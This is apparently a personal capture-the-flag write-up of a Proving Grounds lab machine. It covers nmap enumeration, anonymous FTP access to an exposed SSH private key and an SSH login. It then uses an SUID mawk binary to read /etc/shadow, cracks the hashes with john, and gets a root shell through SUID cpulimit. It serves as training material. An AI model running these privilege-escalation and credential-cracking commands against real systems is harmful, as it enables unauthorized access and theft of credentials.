nmap

| Port      | State | Service | Version       |
| --------- | ----- | ------- | ------------- |
| 21/tcp    | open  | ftp     | vsftpd 3.0.3  |
| 61000/tcp | open  | ssh     | OpenSSH 7.9p1 |

Initially i only get back the ftp port, byt after running nmap on all ports we get get back that ssh on p 61000. 

The ftp port has anon login so i'll take a look at that first. 

```php
ls -la
```

```php
drwxr-xr-x    3 0        115          4096 Aug 06  2020 .
drwxr-xr-x    3 0        115          4096 Aug 06  2020 ..
drwxr-xr-x    2 0        0            4096 Aug 06  2020 .hannah
```

I cd into .hannah

```php
-rwxr-xr-x    1 0        0            1823 Aug 06  2020 id_rsa
```

I try the ssh id_rsa but get asked for a password. Maybe i need to brute-force.

```php
kali@192.168.190.130
```

I forgot to set the permissions of the file

```php
chmod 600 id_rsa
```

```php
ssh -i id_rsa hannah@$IP -p 61000
```

I  can now login as the user hannah.

I get the first flag from local.txt
`68ecb2a32d693aa0ee9feab360333749`

**Linpeas**

SUID
usr/bin/cpulimit
/usr/bin/mawk

https://gtfobins.github.io/gtfobins/mawk/

```php
sudo mawk 'BEGIN {system("/bin/sh")}'
```

- sudo is not installed

Unfortunately, my time ran out on proving grounds, so i'll have to wait to finish it off. 

```php
LFILE=file_to_read
```

```php
./mawk '//' "$LFILE"
```

- /etc/shadow

![[Pasted image 20240915075440.png]]

```php
unshadow passwd.txt shad.txt > unshad.txt
```

```php
john --wordlist=/usr/share/wordlists/rockyou.txt unshad.txt
```

```php
john <hash file> --show
```

Waiting for john to crack the password i tried the other attack vector: `usr/bin/cpulimit`

Root exploit 
https://gtfobins.github.io/gtfobins/cpulimit/

```php
./cpulimit -l 100 -f -- /bin/sh -p
```

![[Pasted image 20240915075053.png]]

Flag
`c1b56f4aa40fb9117e60cead401680e5`

---

